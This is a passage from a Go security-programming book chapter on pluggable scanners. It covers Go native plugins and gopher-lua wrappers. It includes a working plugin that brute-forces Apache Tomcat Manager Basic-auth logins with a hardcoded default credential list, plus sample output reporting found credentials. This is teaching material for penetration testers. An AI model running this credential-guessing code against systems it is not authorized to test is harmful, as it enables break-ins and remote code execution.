        check = newFunc(){
        res = check.Check("10.0.1.20", 8080) |
        if res.Vulnerable { }
            log.Println("Host is vulnerable: " + res.Details)
        } else {
            log.Println("Host is NOT vulnerable")
        }
    }   
}
Listing 10-2: The scanner client that runs plug-ins (/ch-10/plugin-core /cmd/scanner/main.go)
The code starts by defining the location of your plug-ins u. In this case, 
you’ve hardcoded it; you could certainly improve the code so it reads this 
value in as an argument or environment variable instead. You use this vari-
able to call ioutil.ReadDir(PluginDir) and obtain a file listing v, and then loop 
over each of these plug-in files w. For each file, you use Go’s plugin package 
to read the plug-in via a call to plugin.Open() x. If this succeeds, you’re given 
a *plugin.Plugin instance, which you assign to the variable named p. You call 
p.Lookup("New") to search your plug-in for a symbol named New y. 
As we mentioned during the high-level overview earlier, this symbol 
lookup convention requires your main program to provide the explicit 
name of the symbol as an argument, meaning you expect the plug-in 
to have an exported symbol by the same name—in this case, our main 
program is looking for the symbol named New. Furthermore, as you’ll see 
shortly, the code expects the symbol to be a function that will return a 
concrete implementation of your scanner.Checker interface, which we dis-
cussed in the previous section.
Assuming your plug-in contains a symbol named New, you make 
a type assertion for the symbol as you try to convert it to type func() 
scanner.Checker z. That is, you’re expecting the symbol to be a func-
tion that returns an object implementing scanner.Checker. You assign 
前沿信安资讯阵地  公众号：i nf osrc
222   Chapter 10
the converted value to a variable named newFunc. Then you invoke it and 
assign the returned value to a variable named check {. Thanks to your type 
assertion, you know that check satisfies your scanner.Checker interface, so it 
must implement a Check() function. You call it, passing in a target host and 
port |. The result, a *scanner.Result, is captured using a variable named res 
and inspected to determine whether the service was vulnerable or not }.
Notice that this process is generic; it uses type assertions and inter-
faces to create a construct through which you can dynamically call plug-
ins. Nothing within the code is specific to a single vulnerability signature 
or method used to check for a vulnerability’s existence. Instead, you’ve 
abstracted the functionality enough that plug-in developers can create 
stand-alone plug-ins that perform units of work without having knowledge 
of other plug-ins—or even extensive knowledge of the consuming applica-
tion. The only thing that plug-in authors must concern themselves with is 
properly creating the exported New() function and a type that implements 
scanner.Checker. Let’s have a look at a plug-in that does just that.
Building a Password-Guessing Plug-in
This plug-in (Listing 10-3) performs a password-guessing attack against the 
Apache Tomcat Manager login portal. A favorite target for attackers, the 
portal is commonly configured to accept easily guessable credentials. With 
valid credentials, an attacker can reliably execute arbitrary code on the 
underlying system. It’s an easy win for attackers. 
In our review of the code, we won’t cover the specific details of the vul-
nerability test, as it’s really just a series of HTTP requests issued to a specific 
URL. Instead, we’ll focus primarily on satisfying the pluggable scanner’s 
interface requirements.
import (
    // Some snipped for brevity
    "github.com/bhg/ch-10/plugin-core/scanner" u
)
var Users = []string{"admin", "manager", "tomcat"}
var Passwords = []string{"admin", "manager", "tomcat", "password"}
// TomcatChecker implements the scanner.Check interface. Used for guessing Tomcat creds
type TomcatChecker struct{} v
// Check attempts to identify guessable Tomcat credentials
func (c *TomcatChecker) Check(host string, port uint64) *scanner.Result { w
    var (
        resp   *http.Response
        err    error
        url    string
        res    *scanner.Result
        client *http.Client
        req    *http.Request
    )   
    log.Println("Checking for Tomcat Manager...")
前沿信安资讯阵地  公众号：i nf osrc
Go Plugins and Extendable Tools   223
    res = new(scanner.Result) x
    url = fmt.Sprintf("http://%s:%d/manager/html", host, port)
    if resp, err = http.Head(url); err != nil {
        log.Printf("HEAD request failed: %s\n", err)
        return res 
    }   
    log.Println("Host responded to /manager/html request")
    // Got a response back, check if authentication required
    if resp.StatusCode != http.StatusUnauthorized || resp.Header.Get("WWW-Authenticate") == "" {
        log.Println("Target doesn't appear to require Basic auth.")
        return res 
    }   
    // Appears authentication is required. Assuming Tomcat manager. Guess passwords...
    log.Println("Host requires authentication. Proceeding with password guessing...")
    client = new(http.Client)
    if req, err = http.NewRequest("GET", url, nil); err != nil {
        log.Println("Unable to build GET request")
        return res 
    }
    for _, user := range Users {
        for _, password := range Passwords {
            req.SetBasicAuth(user, password)
            if resp, err = client.Do(req); err != nil {
                log.Println("Unable to send GET request")
                continue
            }
            if resp.StatusCode == http.StatusOK { y
                res.Vulnerable = true
                res.Details = fmt.Sprintf("Valid credentials found - %s:%s", user, password)
                return res 
            }   
        }   
    }   
    return res 
}
// New is the entry point required by the scanner
func New() scanner.Checker { z
    return new(TomcatChecker)
}
Listing 10-3: Creating a Tomcat credential-guessing plug-in natively (/ch-10 /plugin-tomcat/main.go)
First, you need to import the scanner package we detailed previously u. 
This package defines both the Checker interface and the Result struct that 
you’ll be building. To create an implementation of Checker, you start by 
defining an empty struct type named TomcatChecker v. To fulfill the Checker 
interface’s implementation requirements, you create a method matching 
the required Check(host string, port uint64) *scanner.Result function signa-
ture w. Within this method, you perform all of your custom vulnerability-
checking logic. 
Since you’re expected to return a *scanner.Result, you initialize one, 
assigning it to a variable named res x. If the conditions are met—that is, 
前沿信安资讯阵地  公众号：i nf osrc
224   Chapter 10
if the checker verifies the guessable credentials—and the vulnerability is 
confirmed y, you set res.Vulnerable to true and set res.Details to a message 
containing the identified credentials. If the vulnerability isn’t identified, the 
instance returned will have res.Vulnerable set to its default state—false.
Lastly, you define the required exported function New() *scanner 
.Checker z. This adheres to the expectations set by your scanner’s Lookup() 
call, as well as the type assertion and conversion needed to instantiate the 
plug-in-defined TomcatChecker. This basic entry point does nothing more 
than return a new *TomcatChecker (which, since it implements the required 
Check() method, happens to be a scanner.Checker).
Running the Scanner
Now that you’ve created both your plug-in and the main program that con-
sumes it, compile your plug-in, using the -o option to direct your compiled 
shared object to the scanner’s plug-ins directory:
$ go build -buildmode=plugin -o /path/to/plugins/tomcat.so
Then run your scanner (cmd/scanner/main.go) to confirm that it identi-
fies the plug-in, loads it, and executes the plug-in’s Check() method:
$ go run main.go 
Found plugin: tomcat.so
2020/01/15 15:45:18 Checking for Tomcat Manager...
2020/01/15 15:45:18 Host responded to /manager/html request
2020/01/15 15:45:18 Host requires authentication. Proceeding with password guessing...
2020/01/15 15:45:18 Host is vulnerable: Valid credentials found - tomcat:tomcat
Would you look at that? It works! Your scanner is able to call code 
within your plug-in. You can drop any number of other plug-ins into the 
plug-ins directory. Your scanner will attempt to read each and kick off the 
vulnerability-checking functionality.
The code we developed could benefit from a number of improvements. 
We’ll leave these improvements to you as an exercise. We encourage you to 
try a few things:
1. Create a plug-in to check for a different vulnerability.
2. Add the ability to dynamically supply a list of hosts and their open ports 
for more extensive tests.
3. Enhance the code to call only applicable plug-ins. Currently, the code 
will call all plug-ins for the given host and port. This isn’t ideal. For 
example, you wouldn’t want to call the Tomcat checker if the target 
port isn’t HTTP or HTTPS. 
4. Convert your plug-in system to run on Windows, using DLLs as the 
plug-in type.
In the next section, you’ll build the same vulnerability-checking plug-in 
in a different, unofficial plug-in system: Lua.
前沿信安资讯阵地  公众号：i nf osrc
Go Plugins and Extendable Tools   225
Building Plug-ins in Lua
Using Go’s native buildmode feature when creating pluggable programs 
has limitations, particularly because it’s not very portable, meaning the 
plug-ins may not cross-compile nicely. In this section, we’ll look at a way 
to overcome this deficiency by creating plug-ins with Lua instead. Lua is a 
scripting language used to extend various tools. The language itself is easily 
embeddable, powerful, fast, and well-documented. Security tools such as 
Nmap and Wireshark use it for creating plug-ins, much as you’ll do right 
now. For more info, refer to the official site at https://www.lua.org/.
To use Lua within Go, you’ll use a third-party package, gopher-lua, 
which is capable of compiling and executing Lua scripts directly in Go. 
Install it on your system by entering the following:
$ go get github.com/yuin/gopher-lua
Now, be forewarned that the price you’ll pay for portability is increased 
complexity. That’s because Lua has no implicit way to call functions in your 
program or various Go packages and has no knowledge of your data types. 
To solve this problem, you’ll have to choose one of two design patterns:
1. Call a single entry point in your Lua plug-in, and let the plug-in call 
any helper methods (such as those needed to issue HTTP requests) 
through other Lua packages. This makes your main program simple, 
but it reduces portability and could make dependency management a 
nightmare. For example, what if a Lua plug-in requires a third-party 
dependency not installed as a core Lua package? Your plug-in would 
break the moment you move it to another system. Also, what if two 
separate plug-ins require different versions of a package?
2. In your main program, wrap the helper functions (such as those from 
the net/http package) in a manner that exposes a façade through 
which the plug-in can interact. This, of course, requires you to write 
extensive code to expose all the Go functions and types. However, 
once you’ve written the code, the plug-ins can reuse it in a consistent 
manner. Plus, you can sort of not worry about the Lua dependency 
issues that you’d have if you used the first design pattern (although, 
of course, there’s always the chance that a plug-in author uses a third-
party library and breaks something).
For the remainder of this section, you’ll work on the second design 
pattern. You’ll wrap your Go functions to expose a façade that’s accessible 
to your Lua plug-ins. It’s the better of the two solutions (and plus, the word 
façade makes it sound like you’re building something really fancy).
The bootstrapping, core Go code that loads and runs plug-ins will 
reside in a single file for the duration of this exercise. For the sake of sim-
plicity, we’ve specifically removed some of patterns used in the examples 
at https://github.com/yuin/gopher-lua/. We felt that some of the patterns, 
such as using user-defined types, made the code less readable. In a real 
前沿信安资讯阵地  公众号：i nf osrc
226   Chapter 10
implementation, you’d likely want to include some of those patterns for better 
flexibility. You’d also want to include more extensive error and type checking.
Your main program will define functions to issue GET and HEAD HTTP 
requests, register those functions with the Lua virtual machine (VM), and 
load and execute your Lua scripts from a defined plug-ins directory. You’ll 
build the same Tomcat password-guessing plug-in from the previous section, 
so you’ll be able to compare the two versions. 
Creating the head() HTTP Function
Let’s start with the main program. First, let’s look at the head() HTTP func-
tion, which wraps calls to Go’s net/http package (Listing 10-4).
func head(l *lua.LStateu) int {
    var (
        host string
        port uint64
        path string
        resp *http.Response
        err  error
        url  string
    )
    v host = l.CheckString(1)
    port = uint64(l.CheckInt64(2))
    path = l.CheckString(3)
    url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
    if resp, err = http.Head(url); err != nil {
        w l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Request failed: %s", err)))
        x return 3
    }
    y l.Push(lua.LNumber(resp.StatusCode))
    l.Push(lua.LBool(resp.Header.Get("WWW-Authenticate") != ""))
    l.Push(lua.LString(""))
    z return 3
}
Listing 10-4: Creating a head() function for Lua ( /ch-10/lua-core/cmd/scanner/main.go)
First, notice that your head() function accepts a pointer to a lua.LState 
object and returns an int u. This is the expected signature for any func-
tion you wish to register with the Lua VM. The lua.LState type maintains 
the running state of the VM, including any parameters passed in to Lua 
and returned from Go, as you’ll see shortly. Since your return values will be 
included within the lua.LState instance, the int return type represents the 
number of values returned. That way, your Lua plug-in will be able to read 
and use the return values. 
Since the lua.LState object, l, contains any parameters passed to your 
function, you read the data in via calls to l.CheckString() and l.CheckInt64() v. 
(Although not needed for our example, other Check* functions exist to 
accommodate other expected data types.) These functions receive an 
前沿信安资讯阵地  公众号：i nf osrc
Go Plugins and Extendable Tools   227
integer value, which acts as the index for the desired parameter. Unlike Go 
slices, which are 0-indexed, Lua is 1-indexed. So, the call to l.CheckString(1) 
retrieves the first parameter supplied in the Lua function call, expecting 
it to be a string. You do this for each of your expected parameters, passing 
in the proper index of the expected value. For your head() function, you’re 
expecting Lua to call head(host, port, path), where host and path are strings 
and port is an integer. In a more resilient implementation, you’d want to do 
additional checking here to make sure the data supplied is valid.
The function proceeds to issue an HTTP HEAD request and perform 
some error checking. In order to return values to your Lua callers, you 
push the values onto your lua.LState by calling l.Push() and passing it an 
object that fulfills the lua.LValue interface type w. The gopher-lua package 
contains several types that implement this interface, making it as easy as 
calling lua.LNumber(0) and lua.LBool(false), for example, to create numer-
ical and boolean return types. 
In this example, you’re returning three values. The first is the HTTP 
status code, the second determines whether the server requires basic authen-
tication, and the third is an error message. We’ve chosen to set the status 
code to 0 if an error occurs. You then return 3, which is the number of items 
you’ve pushed onto your LState instance x. If your call to http.Head() doesn’t 
produce an error, you push your return values onto LState y, this time with a 
valid status code, and then check for basic authentication and return 3 z.
Creating the get() Function
Next, you’ll create your get() function, which, like the previous example, 
wraps the net/http package’s functionality. In this case, however, you’ll issue 
an HTTP GET request. Other than that, the get() function uses fairly simi-
lar constructs as your head() function by issuing an HTTP request to your 
target endpoint. Enter the code in Listing 10-5.
func get(l *lua.LState) int {
    var (
        host     string
        port     uint64
        username string
        password string
        path     string
        resp     *http.Response
        err      error
        url      string
        client   *http.Client
        req      *http.Request
    )   
    host = l.CheckString(1)
    port = uint64(l.CheckInt64(2))
    u username = l.CheckString(3)
    password = l.CheckString(4)
    path = l.CheckString(5)
    url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
    client = new(http.Client)
前沿信安资讯阵地  公众号：i nf osrc
228   Chapter 10
    if req, err = http.NewRequest("GET", url, nil); err != nil {
        l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Unable to build GET request: %s", err)))
        return 3 
    }   
    if username != "" || password != "" {
        // Assume Basic Auth is required since user and/or password is set